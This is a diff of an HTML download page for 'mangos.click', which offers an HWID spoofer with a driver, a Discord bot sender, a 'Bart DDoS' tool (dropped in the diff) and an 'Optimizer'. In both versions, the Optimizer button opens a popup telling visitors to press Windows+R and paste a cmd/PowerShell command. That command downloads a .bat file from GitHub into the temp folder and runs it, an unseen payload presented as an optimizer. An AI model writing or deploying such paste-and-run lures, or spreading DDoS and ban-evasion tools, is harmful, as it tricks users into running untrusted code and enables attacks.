@@ -12,135 +12,94 @@
   <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
   <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
   <style>
-
-.shake {
-  animation: slightShake 0.2s;
-}
-
-@keyframes slightShake {
-  0% { transform: translateX(0); }
-  25% { transform: translateX(-1px); }
-  50% { transform: translateX(1px); }
-  75% { transform: translateX(-1px); }
-  100% { transform: translateX(0); }
-}
-
-
-/* Shadow on hover */
-.search-container:hover {
-  box-shadow: 0 0 10px rgba(255, 255, 255, 0.2), 0 4px 20px rgba(0, 0, 0, 0.6);
-  transition: box-shadow 0.3s ease;
-}
-
     * {
       cursor: url('https://files.catbox.moe/5uebbf.cur'), auto !important;
-      box-sizing: border-box;
     }
-
     body {
       margin: 0;
       padding: 0;
       font-family: 'Press Start 2P', cursive;
       background-color: #1e1e1e;
       color: white;
-      min-height: 100vh;
-      overflow-x: hidden;
+      height: 100vh;
+      overflow-y: auto;
     }
-
     .blurred {
       filter: blur(5px);
       pointer-events: none;
     }
-
     .header {
-      position: fixed;
-      top: 10px;
-      left: 10px;
-      font-size: 10px;
-      z-index: 10;
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      font-size: 12px;
     }
-
     .main-content {
       display: flex;
       justify-content: center;
-      margin-top: 60px;
-      padding: 0 10px;
+      position: absolute;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
       width: 100%;
     }
-
     .search-container {
       background-color: #2e2e2e;
       border-radius: 12px;
-      padding: 10px;
+      padding: 20px;
       display: flex;
       align-items: center;
-      width: 100%;
-      max-width: 500px;
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
     }
-
     .search-input {
       background: none;
       border: none;
       outline: none;
       color: white;
-      font-size: 12px;
+      font-size: 16px;
       margin-left: 10px;
-      flex: 1;
       font-family: 'Press Start 2P', cursive;
     }
-
     .icon {
       color: white;
     }
-
     .boxes-container {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-    gap: 20px;
-    justify-items: center;
-    padding: 100px 20px 20px;
-   }
-
-
+      position: absolute;
+      top: 100px;
+      left: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
     .box {
       background-color: #2e2e2e;
       border: 4px solid #000;
       padding: 20px;
       border-radius: 10px;
-      width: 100%;
-      max-width: 320px;
+      max-width: 300px;
       box-shadow: 0 0 20px rgba(0,0,0,0.5);
     }
-
     .box-title {
       font-size: 12px;
       margin-bottom: 10px;
-      text-align: center;
     }
-
     .box-description {
-      font-size: 10px;
+      font-size: 8px;
       margin-bottom: 15px;
-      text-align: center;
     }
-
     .box-button {
       background-color: #3c8527;
       color: white;
-      padding: 10px;
-      font-size: 10px;
+      padding: 8px 16px;
+      font-size: 8px;
       font-family: 'Press Start 2P', cursive;
       border: 2px solid #000;
       cursor: pointer;
-      width: 100%;
       transition: background 0.2s;
     }
-
     .box-button:hover {
       background-color: #2c651f;
     }
-
     .popup-overlay {
       position: fixed;
       top: 0;
@@ -152,45 +111,37 @@
       align-items: center;
       justify-content: center;
       z-index: 9999;
-      padding: 10px;
     }
-
     .popup {
       background-color: #2e2e2e;
       border: 4px solid #000;
-      padding: 20px;
+      padding: 30px;
       border-radius: 10px;
       text-align: center;
-      width: 100%;
       max-width: 400px;
       box-shadow: 0 0 30px rgba(0,0,0,0.7);
     }
-
     .popup-title {
-      font-size: 16px;
+      font-size: 18px;
       margin-bottom: 20px;
     }
-
     .popup-text {
       font-size: 10px;
-      margin-bottom: 20px;
+      margin-bottom: 30px;
     }
-
     .popup-button {
       background-color: #3c8527;
       color: white;
-      padding: 10px;
+      padding: 10px 20px;
       font-size: 10px;
       font-family: 'Press Start 2P', cursive;
       border: 2px solid #000;
       cursor: pointer;
       transition: background 0.2s;
     }
-
     .popup-button:hover {
       background-color: #2c651f;
     }
-
     .snowflake {
       position: fixed;
       top: -10px;
@@ -199,149 +150,97 @@
       pointer-events: none;
       z-index: 1000;
       animation: fall linear infinite;
-      font-size: 14px;
     }
-
     @keyframes fall {
       0% { transform: translateY(0); opacity: 1; }
       100% { transform: translateY(100vh); opacity: 0; }
     }
-
-    .falling-char {
-      position: fixed;
-      z-index: 9999;
-      animation: fallChar 1.5s ease-out forwards;
-      color: white;
-      font-family: 'Press Start 2P', cursive;
-      pointer-events: none;
-    }
-
-    @keyframes fallChar {
-      0% {
-        transform: translateY(0) rotate(0deg);
-        opacity: 1;
-      }
-      100% {
-        transform: translateY(100vh) rotate(360deg);
-        opacity: 0;
-      }
-    }
-
-    @media (max-width: 480px) {
-      .header { font-size: 8px; }
-      .popup-title { font-size: 14px; }
-      .popup-text { font-size: 9px; }
-      .box-description,
-      .box-button,
-      .popup-button,
-      .search-input { font-size: 8px; }
-    }
-
-
   </style>
 </head>
 <body>
+  <div id="content">
+    <div class="header">mangos.click</div>
+    <div class="main-content">
+      <div class="search-container">
+        <i data-lucide="search" class="icon"></i>
+        <input type="text" class="search-input" placeholder="search..." oninput="filterBoxes(this.value)" />
+      </div>
+    </div>
 
-<!-- Tutorial Popup -->
-<div id="tutorial-popup" class="popup-overlay" style="display: none;">
-  <div class="popup">
-    <div class="popup-title">tutorial</div>
-    <div class="popup-text">press windows + r and paste the code, then hit enter</div>
-    <input id="copy-code" type="text" readonly value='cmd /c "powershell -Command iwr https://raw.githubusercontent.com/dariosfiles/mangosclick-files/refs/heads/main/opt.bat -OutFile %temp%\opt.bat && start cmd /k %temp%\opt.bat"' onclick="this.select();document.execCommand("copy");">
-    <button class="popup-button" onclick="closeTutorial()">okay!</button>
-  </div>
-</div>
-
-  <div class="header">mangos.click</div>
-
-  <div class="main-content">
-    <div class="search-container">
-      <i data-lucide="search" class="icon"></i>
-      <input type="text" class="search-input" placeholder="search..." maxlength="29" oninput="filterBoxes(this.value)" />
+    <div class="boxes-container" id="boxes">
+      <div class="box">
+        <div class="box-title">Discord!</div>
+        <div class="box-description">Join the Discord community!</div>
+        <a href="https://discord.gg/b3nbHKSNmU" target="_blank" class="box-button">Join</a>
+      </div>
+      <div class="box">
+        <div class="box-title">HWID Spoofer Source</div>
+        <div class="box-description">Open Source HWID Spoofer, comes with a driver.</div>
+        <a href="https://files.catbox.moe/c6ka9t.rar" target="_blank" class="box-button">Download</a>
+      </div>
+      <div class="box">
+        <div class="box-title">Discord Bot Message Sender</div>
+        <div class="box-description">Sends message through an .exe (Needs bot token) (Unofficial! Suggested by users)</div>
+        <a href="https://files.catbox.moe/1k2qid.zip" target="_blank" class="box-button">Download</a>
+      </div>
+      <div class="box">
+        <div class="box-title">Optimizer</div>
+        <div class="box-description">A user-level optimizer for old computers.</div>
+        <button class="box-button">Download</button>
+      </div>
     </div>
   </div>
 
-  <div class="boxes-container" id="boxes">
-    <div class="box">
-      <div class="box-title">Discord!</div>
-      <div class="box-description">Join the Discord community!</div>
-      <a href="https://discord.gg/b3nbHKSNmU" target="_blank" class="box-button">Join</a>
-    </div>
-    <div class="box">
-      <div class="box-title">HWID Spoofer Source</div>
-      <div class="box-description">Open Source HWID Spoofer, comes with a driver.</div>
-      <a href="https://files.catbox.moe/c6ka9t.rar" target="_blank" class="box-button">Download</a>
-    </div>
-    <div class="box">
-      <div class="box-title">Bart DDoS</div>
-      <div class="box-description">This only pings!</div>
-      <a href="https://files.catbox.moe/qth67q.zip" target="_blank" class="box-button">Download</a>
-    </div>
-    <div class="box">
-      <div class="box-title">Optimizer</div>
-      <div class="box-description">A user-level optimizer for old computers.</div>
-      <button class="box-button">Download</button>
-    </div>
-  </div>
-
+  <!-- Welcome Popup -->
   <div id="popup" class="popup-overlay">
     <div class="popup">
       <div class="popup-title">welcome</div>
-      <div class="popup-text">welcome to my website! join the discord to support me.</div>
-      <button class="popup-button" onclick="closePopup()">enter</button>
+      <div class="popup-text">welcome to my website!</div>
+      <button class="popup-button" onclick="closePopup()">okay!</button>
+    </div>
+  </div>
+
+  <!-- Tutorial Popup -->
+  <div id="tutorial-popup" class="popup-overlay" style="display: none;">
+    <div class="popup">
+      <div class="popup-title">tutorial</div>
+      <div class="popup-text">press windows + r and paste the code, then hit enter</div>
+      <input id="copy-code" type="text" readonly value='cmd /c "powershell -Command iwr https://raw.githubusercontent.com/dariosfiles/mangosclick-files/refs/heads/main/opt.bat -OutFile %temp%\opt.bat && start cmd /k %temp%\opt.bat"' style="width: 100%; font-size: 8px; font-family: 'Press Start 2P', cursive; padding: 8px; margin-bottom: 20px; text-align: center; border: 2px solid #000; background-color: #1e1e1e; color: white;" onclick="this.select();document.execCommand('copy');">
+      <button class="popup-button" onclick="closeTutorial()">okay!</button>
     </div>
   </div>
 
   <audio id="popup-sound" src="https://myinstants.com/media/sounds/bow_shoot.mp3"></audio>
 
   <script>
+    window.addEventListener("DOMContentLoaded", () => {
+      lucide.createIcons();
+      document.getElementById('content').classList.add('blurred');
 
-function showTutorial() {
-  document.getElementById('tutorial-popup').style.display = 'flex';
-const searchInput = document.querySelector('.search-input');
-searchInput.addEventListener('input', () => {
-  searchInput.classList.remove('shake');
-  void searchInput.offsetWidth; // force reflow to restart animation
-  searchInput.classList.add('shake');
-});
-  document.getElementById('content').classList.add('blurred');
-}
-
-function closeTutorial() {
-  document.getElementById('tutorial-popup').style.display = 'none';
-  document.getElementById('content').classList.remove('blurred');
-}
-
-// Automatically attach the popup event to the Optimizer box
-window.addEventListener("DOMContentLoaded", () => {
-  document.querySelectorAll('.box-button').forEach(btn => {
-    const title = btn.closest('.box')?.querySelector('.box-title')?.innerText.toLowerCase();
-    if (btn.innerText.toLowerCase().includes('download') && title?.includes('optimizer')) {
-      btn.addEventListener('click', showTutorial);
-    }
-  });
-});
-
-    lucide.createIcons();
-
-    document.addEventListener('DOMContentLoaded', () => {
-      document.getElementById('popup').style.display = 'flex';
-
-      // Snow effect
-      setInterval(() => {
-        const snow = document.createElement('div');
-        snow.className = 'snowflake';
-        snow.innerHTML = '❄';
-        snow.style.left = Math.random() * 100 + 'vw';
-        snow.style.animationDuration = (Math.random() * 3 + 2) + 's';
-        document.body.appendChild(snow);
-        setTimeout(() => snow.remove(), 5000);
-      }, 200);
+      document.querySelectorAll('.box-button').forEach(btn => {
+        if (btn.innerText.toLowerCase().includes('download')) {
+          const title = btn.closest('.box').querySelector('.box-title').innerText.toLowerCase();
+          if (title.includes('optimizer')) {
+            btn.addEventListener('click', showTutorial);
+          }
+        }
+      });
     });
 
     function closePopup() {
       document.getElementById('popup-sound').play();
       document.getElementById('popup').style.display = 'none';
+      document.getElementById('content').classList.remove('blurred');
+    }
+
+    function closeTutorial() {
+      document.getElementById('tutorial-popup').style.display = 'none';
+      document.getElementById('content').classList.remove('blurred');
+    }
+
+    function showTutorial() {
+      document.getElementById('tutorial-popup').style.display = 'flex';
+      document.getElementById('content').classList.add('blurred');
     }
 
     function filterBoxes(query) {
@@ -352,16 +251,19 @@ window.addEventListener("DOMContentLoaded", () => {
         const description = box.querySelector('.box-description').innerText.toLowerCase();
         box.style.display = (title.includes(query) || description.includes(query)) ? 'block' : 'none';
       });
-
-      if (query.length >= 29) {
-        const span = document.createElement('span');
-        span.className = 'falling-char';
-        span.style.left = Math.random() * window.innerWidth + 'px';
-        span.textContent = query.charAt(query.length - 1);
-        document.body.appendChild(span);
-        setTimeout(() => span.remove(), 2000);
-      }
     }
+
+    function createSnowflake() {
+      const snowflake = document.createElement('div');
+      snowflake.classList.add('snowflake');
+      snowflake.style.left = Math.random() * window.innerWidth + 'px';
+      snowflake.style.animationDuration = 2 + Math.random() * 3 + 's';
+      snowflake.style.fontSize = Math.random() * 10 + 10 + 'px';
+      snowflake.innerText = '❄';
+      document.body.appendChild(snowflake);
+      setTimeout(() => snowflake.remove(), 5000);
+    }
+    setInterval(createSnowflake, 200);
   </script>
 </body>
 </html>
